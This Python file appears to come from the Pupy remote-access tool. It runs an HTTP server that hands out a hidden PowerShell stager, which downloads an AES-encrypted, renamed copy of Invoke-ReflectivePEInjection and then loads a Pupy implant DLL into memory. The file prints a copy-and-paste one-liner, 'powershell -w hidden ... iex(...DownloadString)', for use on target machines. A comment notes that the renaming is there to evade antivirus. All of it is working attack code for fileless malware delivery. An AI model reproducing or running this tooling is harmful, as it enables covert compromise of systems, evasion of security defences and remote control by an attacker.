#!/usr/bin/env python
# -*- coding: UTF8 -*-
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
import os.path
import base64
from pupylib.utils.term import colorize
import textwrap
import random, string
import time
from pupygen import get_edit_pupyx86_dll, get_edit_pupyx64_dll 
try:
    import ConfigParser as configparser
except ImportError:
    import configparser
from ssl import wrap_socket

ROOT=os.path.abspath(os.path.join(os.path.dirname(__file__),"..",".."))

def pad(s):
    """
    Performs PKCS#7 padding for 128 bit block size.
    """
    return str(s) + chr(16 - len(str(s)) % 16) * (16 - len(str(s)) % 16) 

from Crypto.Cipher import AES
def aes_encrypt(data, key):
    IV="\x00"*16
    cipher = AES.new(key, AES.MODE_CBC, IV)
    return cipher.encrypt(pad(data))


PS1_DECRYPT="""
[Reflection.Assembly]::LoadWithPartialName("System.Security")
function AES-Decrypt($Encrypted, $Passphrase) 
{ 
    $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider
    $IV = New-Object Byte[] 16
    $AES.Mode="CBC"
    $AES.KeySize=128
    $AES.Key=[Text.Encoding]::ASCII.GetBytes($Passphrase)
    $AES.IV = $IV
    $AES.Padding = "None"
    $d = $AES.CreateDecryptor()
    $ms = new-Object IO.MemoryStream @(,$Encrypted)
    $cs = new-Object Security.Cryptography.CryptoStream $ms,$d,"Read"
    $count = $cs.Read($Encrypted, 0, $Encrypted.Length)
    $cs.Close()
    $ms.Close()
    $AES.Clear()
    $Encrypted[0..($Encrypted.Length - $Encrypted[-1] - 1)]
} 
"""

class PupyPayloadHTTPHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path=="/p":
            self.send_response(200)
            self.send_header('Content-type','text/html')
            self.end_headers()
            pe_bootloader=PS1_DECRYPT+"\n"+(textwrap.dedent("""
            $p="%s"
            $rpi=(((New-Object System.Net.WebClient).DownloadData("http://%s:%s/rpi")))
            $path="b64"
            if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8){$path="b32"}
            $raw=([Byte[]]((New-Object System.Net.WebClient).DownloadData("http://%s:%s/"+$path)))
            iex([System.Text.Encoding]::UTF8.GetString( (AES-Decrypt $rpi $p)))
            Write-Output "DLL received"
            $raw=AES-Decrypt $raw $p
            Write-Output "Reflective DLL decrypted"
            [GC]::Collect()
            %s -ForceASLR -PEBytes $raw #-Verbose
            """%(self.server.aes_key, self.server.link_ip, self.server.link_port, self.server.link_ip, self.server.link_port, self.server.random_reflectivepeinj_name)))
            self.wfile.write(pe_bootloader)
            print colorize("[+] ","green")+" powershell script stage1 served !"

        elif self.path=="/rpi":
            #serve the powershell script
            self.send_response(200)
            #self.send_header('Content-type','text/html')
            self.send_header('Content-type','application/octet-stream')
            self.end_headers()
            code=open(os.path.join(ROOT, "external", "PowerSploit", "CodeExecution", "Invoke-ReflectivePEInjection.ps1"), 'r').read()
            code=code.replace("Invoke-ReflectivePEInjection", self.server.random_reflectivepeinj_name) # seems to bypass some av like avast :o)
            d=aes_encrypt(code, self.server.aes_key)
            self.wfile.write(d)
            print colorize("[+] ","green")+" powershell Invoke-ReflectivePEInjection.ps1 script served !"
        elif self.path=="/b32":
            #serve the pupy 32bits dll to load from memory
            self.send_response(200)
            self.send_header('Content-type','application/octet-stream')
            self.end_headers()
            print colorize("[+] ","green")+" generating x86 reflective dll ..."
            self.wfile.write(aes_encrypt(get_edit_pupyx86_dll(self.server.payload_conf), self.server.aes_key))
            print colorize("[+] ","green")+" pupy x86 reflective dll served !"
        elif self.path=="/b64":
            #serve the pupy 64bits dll to load from memory
            self.send_response(200)
            self.send_header('Content-type','application/octet-stream')
            self.end_headers()
            print colorize("[+] ","green")+" generating amd64 reflective dll ..."
            self.wfile.write(aes_encrypt(get_edit_pupyx64_dll(self.server.payload_conf), self.server.aes_key))
            print colorize("[+] ","green")+" pupy amd64 reflective dll served !"
        else:
            self.send_response(404)
            self.end_headers()
            return

class ps1_HTTPServer(HTTPServer):
    def __init__(self, server_address, conf, link_ip, link_port, ssl):
        self.payload_conf = conf
        self.link_ip=link_ip
        self.link_port=link_port
        self.aes_key=''.join([random.choice(string.ascii_lowercase+string.ascii_uppercase+string.digits) for _ in range(0,16)]) # must be 16 char long for aes 128
        self.random_reflectivepeinj_name=''.join([random.choice(string.ascii_lowercase+string.ascii_uppercase+string.digits) for _ in range(0,random.randint(8,12))]) # must be 16 char long for aes 128
        HTTPServer.__init__(self, server_address, PupyPayloadHTTPHandler)
        if ssl:
            config = configparser.ConfigParser()
            config.read("pupy.conf")
            keyfile=config.get("pupyd","keyfile").replace("\\",os.sep).replace("/",os.sep)
            certfile=config.get("pupyd","certfile").replace("\\",os.sep).replace("/",os.sep)
            self.socket = wrap_socket (self.socket, certfile=certfile, keyfile=keyfile, server_side=True)

def serve_ps1_payload(conf, ip="0.0.0.0", port=8080, link_ip="<your_ip>", ssl=False):
    try:
        while True:
            try:
                server = ps1_HTTPServer((ip, port), conf, link_ip, port, ssl)
                break
            except Exception as e:
                # [Errno 98] Adress already in use
                if e[0] == 98:
                    port+=1
                else:
                    raise
        print colorize("[+] ","green")+"copy/paste this one-line loader to deploy pupy without writing on the disk :"
        print " --- "
        oneliner=colorize("powershell.exe -w hidden -noni -nop -c \"iex(New-Object System.Net.WebClient).DownloadString('http://%s:%s/p')\""%(link_ip, port), "green")
        print oneliner
        print " --- "

        print colorize("[+] ","green")+'Started http server on %s:%s '%(ip, port)
        print colorize("[+] ","green")+'waiting for a connection ...'
        server.serve_forever()
    except KeyboardInterrupt:
        print 'KeyboardInterrupt received, shutting down the web server'
        server.socket.close()
        exit()


